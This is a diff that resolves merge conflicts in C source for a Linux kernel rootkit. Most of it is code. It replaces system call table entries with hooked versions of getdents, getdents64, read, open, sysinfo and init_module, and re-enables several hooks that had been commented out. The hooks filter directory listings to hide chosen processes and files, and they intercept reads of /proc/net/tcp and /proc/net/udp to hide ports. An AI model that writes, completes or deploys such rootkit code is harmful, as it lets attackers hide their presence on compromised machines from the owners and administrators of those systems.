@@ -171,9 +171,8 @@ void hack_sys_call_talbe(void)
 	sys_call_table[__NR_getsid] = (void *)(new_sys_getsid);         //66 - 5
 	sys_call_table[__NR_getpriority] = (void *)(new_sys_getpriority);         //96 - 6
 	sys_call_table[__NR_socketcall] = (void *)(new_sys_socketcall);         //102 - 7
-//	sys_call_table[__NR_sysinfo] = (void *)(new_sys_sysinfo);         //116 - 8
+	sys_call_table[__NR_sysinfo] = (void *)(new_sys_sysinfo);         //116 - 8
 	
-<<<<<<< HEAD
 	sys_call_table[__NR_init_module] = (void *)(new_sys_init_module);         //128 - 10
 	sys_call_table[__NR_getpgid] = (void *)(new_sys_getpgid);         //132 - 11
 	sys_call_table[__NR_getdents] = (void *)(new_sys_getdents);         //141 - 12
@@ -181,15 +180,6 @@ void hack_sys_call_talbe(void)
 	sys_call_table[__NR_sched_getscheduler] = (void *)(new_sys_sched_getscheduler);         //157 - 14
 	sys_call_table[__NR_sched_rr_get_interval] = (void *)(new_sys_sched_rr_get_interval);         //161 - 15
 //#if BITS_PER_LONG == 32
-=======
-//	sys_call_table[__NR_init_module] = (void *)(new_sys_init_module);         //128 - 10
-//	sys_call_table[__NR_getpgid] = (void *)(new_sys_getpgid);         //132 - 11
-//	sys_call_table[__NR_getdents] = (void *)(new_sys_getdents);         //141 - 12
-//	sys_call_table[__NR_sched_getparam] = (void *)(new_sys_sched_getparam);         //155 - 13
-//	sys_call_table[__NR_sched_getscheduler] = (void *)(new_sys_sched_getscheduler);         //157 - 14
-//	sys_call_table[__NR_sched_rr_get_interval] = (void *)(new_sys_sched_rr_get_interval);         //161 - 15
-#if BITS_PER_LONG == 32
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 	sys_call_table[__NR_stat64] = (void *)(new_sys_stat64);           //195 - 17
 	sys_call_table[__NR_lstat64] = (void *)(new_sys_lstat64);             //196 - 18
 //#endif	
@@ -210,20 +200,16 @@ void unhack_sys_call_talbe(void)
 	sys_call_table[__NR_getsid] = (void *)(original_sys_getsid);          //66 - 5
 	sys_call_table[__NR_getpriority] = (void *)(original_sys_getpriority);          //96 - 6
 	sys_call_table[__NR_socketcall] = (void *)(original_sys_socketcall);          //102 - 7
-//	sys_call_table[__NR_sysinfo] = (void *)(original_sys_sysinfo);          //116 - 8
+	sys_call_table[__NR_sysinfo] = (void *)(original_sys_sysinfo);          //116 - 8
 	
-<<<<<<< HEAD
+	sys_call_table[__NR_init_module] = (void *)(original_sys_init_module);          //128 - 10
+	sys_call_table[__NR_getpgid] = (void *)(original_sys_getpgid);          //132 - 11
+	sys_call_table[__NR_getdents] = (void *)(original_sys_getdents);          //141 - 12
+	sys_call_table[__NR_sched_getparam] = (void *)(original_sys_sched_getparam);          //155 - 13
+	sys_call_table[__NR_sched_getscheduler] = (void *)(original_sys_sched_getscheduler);          //157 - 14
+	sys_call_table[__NR_sched_rr_get_interval] = (void *)(original_sys_sched_rr_get_interval);          //161 - 15
+	
 //#if BITS_PER_LONG == 32
-=======
-//	sys_call_table[__NR_init_module] = (void *)(original_sys_init_module);          //128 - 10
-//	sys_call_table[__NR_getpgid] = (void *)(original_sys_getpgid);          //132 - 11
-//	sys_call_table[__NR_getdents] = (void *)(original_sys_getdents);          //141 - 12
-//	sys_call_table[__NR_sched_getparam] = (void *)(original_sys_sched_getparam);          //155 - 13
-//	sys_call_table[__NR_sched_getscheduler] = (void *)(original_sys_sched_getscheduler);          //157 - 14
-//	sys_call_table[__NR_sched_rr_get_interval] = (void *)(original_sys_sched_rr_get_interval);          //161 - 15
-//	
-#if BITS_PER_LONG == 32
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 	sys_call_table[__NR_stat64] = (void *)(original_sys_stat64);           //195 - 17
 	sys_call_table[__NR_lstat64] = (void *)(original_sys_lstat64);             //196 - 18
 //#endif	
@@ -292,11 +278,7 @@ static asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t co
 			DLog("copy_from_user success!");
 #endif
 		}
-<<<<<<< HEAD
 
-=======
-//		DLog("copy_from_user success!");
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		for (i = 0; i < 2; i++)
 		{
 			for (p = kbuf + max; p < kbuf + ret; p += max)
@@ -323,7 +305,6 @@ static asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t co
 #endif
 			goto out;  
 		}
-<<<<<<< HEAD
 		else
 		{
 #ifdef DEBUG_READ
@@ -331,9 +312,6 @@ static asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t co
 #endif
 		}
 		
-=======
-//		DLog("copy_to_user success!");
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 	}
 out:
 	AvoidNull(kfree, kbuf);	
@@ -364,12 +342,7 @@ static asmlinkage long new_sys_open(const char __user *filename, int flags, int 
 	//用于隐藏端口
 	if (0 == strcmp(openFileName, "/proc/net/tcp")
 	    || 0 == strcmp(openFileName, "/proc/net/udp"))
-<<<<<<< HEAD
 	{ 		
-=======
-	{
- 		
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		rtpid = current->pid;
 		rtfd = ret;
 	}
@@ -599,7 +572,6 @@ out:
  * sys_sysinfo - 116 - 8 - kernel/sys.c
  *
  */
-<<<<<<< HEAD
 //struct sysinfo {
 //	long uptime; /* Seconds since boot */
 //	unsigned long loads[3]; /* 1, 5, and 15 minute load averages */
@@ -615,8 +587,6 @@ out:
 //	unsigned int mem_unit; /* Memory unit size in bytes */
 //	char _f[20 - 2*sizeof(long) - sizeof(int)]; /* Padding to 64 bytes */
 //};
-=======
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 #define DEBUG_SYSINFO
 static asmlinkage long new_sys_sysinfo(struct sysinfo __user *info) {
 	int ret;
@@ -758,34 +728,22 @@ static asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent __u
 	}
 	while (buflen > 0)
 	{
-<<<<<<< HEAD
 		buflen -= pcur->d_reclen; 
 		strcpy(fullname, pwd);
 		strcat(fullname, pcur->d_name);
-=======
-		int len = pcur->d_reclen;
-		buflen -= len;
-
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		if (0 == check_procs(atoi(pcur->d_name)))
 		{
 #ifdef DEBUG_GETDENTS
 			DLog("hide process [%s]@[getdents]", pcur->d_name);
-<<<<<<< HEAD
 #endif
 			ret -= pcur->d_reclen;
 			memmove(pcur, (char *)pcur + pcur->d_reclen , buflen);
-=======
-			ret -= len;
-			memmove(pcur, (char *)pcur + len, buflen);
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		}
 		else
 		{
 			pcur = (struct linux_dirent *)((char*)pcur + pcur->d_reclen );
 		}
 	}
-<<<<<<< HEAD
 	if (!copy_to_user( dirp, pdirp, ret )) {
 #ifdef DEBUG_GETDENTS
 		DLog("sys_getdents copy_from_user success!");
@@ -801,17 +759,6 @@ out:
 	AvoidNull(kfree, pwd);
 	AvoidNull(kfree, fullname);
 	AvoidNull(kfree, pdirp);
-=======
-//	if (!copy_to_user(dirp, pcur, sizeof(struct linux_dirent))) {
-//		DLog("sys_getdents copy_from_user success!");
-//	}
-//	else {
-//		DLog("sys_getdents copy_from_user failure~~");
-//	}
-	
-out:
-	AvoidNull(kfree, pcur);
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 	return ret;
 }
 
@@ -882,7 +829,6 @@ out:
 	return ret;
 }
 
-<<<<<<< HEAD
 
 
 
@@ -891,8 +837,6 @@ out:
 
 
 
-=======
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 
 #if BITS_PER_LONG == 32
 /**
@@ -961,32 +905,20 @@ static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64
 	char *fullname = NULL ;
 	struct linux_dirent64* pcur = NULL;
 	struct linux_dirent64* pdirent = NULL;
-<<<<<<< HEAD
-=======
-	long sum = 0;
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 
 	ret = original_sys_getdents64(fd, dirent, count);
 	if ( 0 == ret )
 	{
-<<<<<<< HEAD
 #ifdef DEBUG_GETDENTS64
 		DLog("directory ends!");
 #endif
-=======
-		DLog("directory ends!");
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		goto out;
 	}
 	else if (  ret < 0  )
 	{
-<<<<<<< HEAD
 #ifdef DEBUG_GETDENTS64
 		DLog("get directory error etc");
 #endif
-=======
-		DLog("get directory error etc");
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		goto out;
 	}
 
@@ -999,7 +931,6 @@ static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64
 	}
 	get_path(pwd, sizeof(pwd), fd);
 	buflen = ret;
-<<<<<<< HEAD
 	pdirent = (struct linux_dirent64*)kmalloc(ret, GFP_KERNEL);
 	//pdirent为该片内存首地址，操作时需要额外的游标指针进行
 	pcur = pdirent;
@@ -1012,30 +943,13 @@ static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64
 #ifdef DEBUG_GETDENTS64
 		DLog("sys_getdents64 copy_from_user failure~~");
 #endif
-=======
-	pcur = (struct linux_dirent64*)kmalloc(ret, GFP_KERNEL);
-	pdirent = pcur;
-	if (!copy_from_user(pdirent, dirent, ret)) {
-		DLog("sys_getdents64 copy_from_user success!");	
-	}
-	else {
-		DLog("sys_getdents64 copy_from_user failure~~");
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		goto out;
 	}
 	while ( buflen > 0)
 	{
 		buflen -= pcur->d_reclen;
-<<<<<<< HEAD
 		strcpy(fullname, pwd);
 		strcat(fullname, pcur->d_name);
-=======
-		sum += pcur->d_reclen;
-		DLog("ret=[%ld],pcur->d_reclen=[%d],sum=[%ld]",ret,pcur->d_reclen,sum);
-		strcpy(fullname, pwd);
-		strcat(fullname, pcur->d_name);
-		DLog("fullname[%s]", fullname);
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		if ( 0 == check_files(fullname) )
 		{
 #ifdef DEBUG_GETDENTS64
@@ -1050,10 +964,7 @@ static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64
 		}
 	}
 	if (!copy_to_user(dirent, pdirent, ret)) {
-<<<<<<< HEAD
 #ifdef DEBUG_GETDENTS64
-=======
->>>>>>> d9d9f44b12f97c6257980270700800b2cffc1552
 		DLog("sys_getdents64 copy_from_user success!");
 #endif
 	}
